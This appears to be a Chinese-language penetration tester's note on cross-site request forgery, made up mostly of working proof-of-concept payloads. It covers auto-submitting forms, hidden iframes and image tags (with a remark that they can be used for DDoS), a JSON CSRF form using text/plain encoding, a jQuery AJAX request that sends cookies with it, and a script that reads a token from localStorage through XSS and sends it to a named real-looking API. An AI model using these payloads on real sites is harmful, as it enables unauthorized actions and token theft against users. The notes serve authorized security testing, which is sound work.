构造的html中js都需要起一个服务器来模拟。
## **1. 自动请求**
```
document.forms[0].subumit();
```
构建伪装xss，诱导访问，常CSRF配合XSS
```
<img>中的src自动get请求。可以实现ddos。
<iframe src=" " width=0></iframe>中的src自动get请求
<script>window.location.href="恶意链接"</script>
```


^
## **2. 表单POC**
BP表单POC
可以伪装POST请求。表单不存在跨域问题会自动携带目标站的cookie，支持x-www-form-urlencoded 、但是BP的表单不支持json。除非使用插件
lazyCSRF<https://www.freebuf.com/articles/web/305569.html>

```
BP请求包右击-相关工具-生成CSRF POC
将请求体的对应请求参数整合成html表单本地文件。本地文件不能直接点击发送，否则请求头origin:null不携带cookie。
本地文件放入静态服务器或bp服务中，选择用登录另一个账号的浏览器去访问服务器下的网页、点击提交请求提交表单成功！没判断refer，file://也能请求到则存在CSRF。
```
BP自带静态服务器<https://www.freebuf.com/articles/web/319873.html>

拼接成json的表单，但是无法修改请求头的Content type，比较鸡肋。大部分支持这个格式时，手动转成x-www-form-urlencoded格式的请求体按常规即可，因为这个接口大概率支持url格式和json格式的请求体。
```
发送的标签会被浏览器自动进行url编码
解决方法：payload中form标签加属性ENCTYPE="text/plain"

<html>
<title>JSON CSRF PIC </title>
<form action="http://127.0.0.1:8085/csrf/update" method="POST"  contenttype="application/json" enctype="text/plain" >
    <input name='{"id":"1","username":"cdminadsada","password":"cdmin","loginname":"admin","headimg":"' value='https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png"}' type='hidden'>
</form>
                                                                                                                                                                   
<script>
      document.forms[0].submit();
</script>
</html>
```


## **3. AJAX的POC**
要完美适配json，则需要用ajax，设置请求头"Content-Type": "application/json"。

还可以读取本地存储，携带token请求头，前提是前端有XSS让其JS在同站读取本地存储。

```
而使用ajax前提是网站解决了跨域问题，网站配置不当让所有请求都可以跨域来。
并且错误配置使得可以自动携带目标站的cookie，(如果不行尝试XSS手动读取携带)

跨域会先发送options请求是否可以。
可以则发送真正请求响应成功。
```
自动携带Cookie型，需要可跨域、Cookie无限制。
```
<script src="<url id="" type="url" status="" title="" wc="">https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script></url> 

<html>
  <meta charset="UTF-8">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form  method="POST">
      <input type="hidden" name="type" value="nick" />
      <input type="hidden" name="nick" value="testCSRF--update" />
      <input type="submit" id="submitButton" value="Submit request" />
    </form>
  </body>

  <script>  
    $(document).ready(function() {  
      $('#submitButton').click(function(e) {  
        e.preventDefault(); // 阻止表单的默认提交行为  
        // 发送json 
        var formData = JSON.stringify({"message":"test","tid":"396884446","type":1});              
        // 获取表单数据  
        // var formData = $(this).closest('form').serialize();  
          
        // 发送AJAX POST请求  
        $.ajax({  
          url: '', // 请求的URL  
          type: 'POST', // 请求方式为POST  
          data: formData, // 请求的数据为表单的内容  
          xhrFields: { // 允许携带cookie  
            withCredentials: true  
          },  
          headers: { // 在这里设置请求头
        "Content-Type": "application/json", // 设置 Content-Type 为 JSON
        "Authorization": "Bearer your_token" // 添加自定义的 Authorization 标头
    },
          success: function(response) {  
            console.log(response); // 处理成功的响应数据  
          },  
          error: function(error) {  
            console.error('请求发生错误:', error); // 处理请求错误  
          }  
        });  
      });  
    });  
  </script>
</html>
```



手动获取token型，需要XSS同站。
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>AJAX Request Example</title>
</head>
<body>

<!-- 按钮用于触发 AJAX 请求 -->
<button id="fetchDataBtn">获取用户信息</button>

<!-- 用于显示 token 和响应结果的元素 -->
<div id="result"></div>

<script>
// 获取按钮和结果展示元素
var button = document.getElementById('fetchDataBtn');
var resultDiv = document.getElementById('result');

// 假设你的 token 存储在 localStorage 中，键名为 'token'
var token = localStorage.getItem('token');

// 为按钮添加点击事件监听器
button.addEventListener('click', function() {
  // 显示 token
  resultDiv.innerHTML = 'Token: ' + token + '<br>';

  // 使用 XMLHttpRequest 发起 AJAX 请求
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://sczyz.org.cn/apiv2/zysc/user/userMessage', true);

  // 设置请求头，携带 token
  xhr.setRequestHeader('token', token);

  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
      // 请求成功，将响应渲染到 HTML 中
      resultDiv.innerHTML += 'Response: ' + xhr.responseText;
    } else {
      // 请求出错
      resultDiv.innerHTML += 'Error: ' + xhr.statusText;
    }
  };

  xhr.onerror = function () {
    // 网络错误
    resultDiv.innerHTML += 'Network Error';
  };

  xhr.send();
});
</script>

</body>
</html>
```


